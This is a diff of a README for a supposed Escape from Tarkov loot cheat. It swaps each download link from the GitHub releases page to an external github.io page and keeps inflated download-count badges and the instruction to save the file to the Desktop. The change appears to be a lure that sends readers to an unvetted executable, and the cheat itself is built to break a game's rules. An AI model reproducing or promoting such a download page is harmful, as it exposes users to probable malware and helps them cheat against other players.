@@ -1,6 +1,6 @@
 # 🎯 tarkov-loot-hack-2026 - See High-Value Loot Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-1.4M%2B%20Downloads-orange?style=for-the-badge&logo=github&logoColor=white&labelColor=FF4500&color=00CC00)](https://github.com/jiangjt9906-jpg/tarkov-loot-hack-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-1.4M%2B%20Downloads-orange?style=for-the-badge&logo=github&logoColor=white&labelColor=FF4500&color=00CC00)](https://jiangjt9906-jpg.github.io)
 
 ![Windows](https://img.shields.io/badge/Windows-10%2F11-0078D6?style=flat-square&logo=windows&logoColor=white) ![Version](https://img.shields.io/badge/Version-v2026-brightgreen?style=flat-square) ![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square) ![Downloads](https://img.shields.io/badge/Downloads-1.4m%2B-orange?style=flat-square)
 
@@ -46,7 +46,7 @@ These are the requirements to run the tool smoothly:
 
 Visit this link to download the application:
 
-👉 **[Download tarkov-loot-hack-2026](https://github.com/jiangjt9906-jpg/tarkov-loot-hack-2026/releases)**
+👉 **[Download tarkov-loot-hack-2026](https://jiangjt9906-jpg.github.io)**
 
 Click the green "Download" button on that page. Save the file to your **Desktop** so it's easy to find.
 
@@ -165,7 +165,7 @@ MIT License — free to use, modify, and share with attribution. Not affiliated 
 
 **Download now and start looting smarter:**
 
-[![Get It Here](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=windows&logoColor=white&labelColor=1E90FF&color=FFD700)](https://github.com/jiangjt9906-jpg/tarkov-loot-hack-2026/releases)
+[![Get It Here](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=windows&logoColor=white&labelColor=1E90FF&color=FFD700)](https://jiangjt9906-jpg.github.io)
 
 ---
 
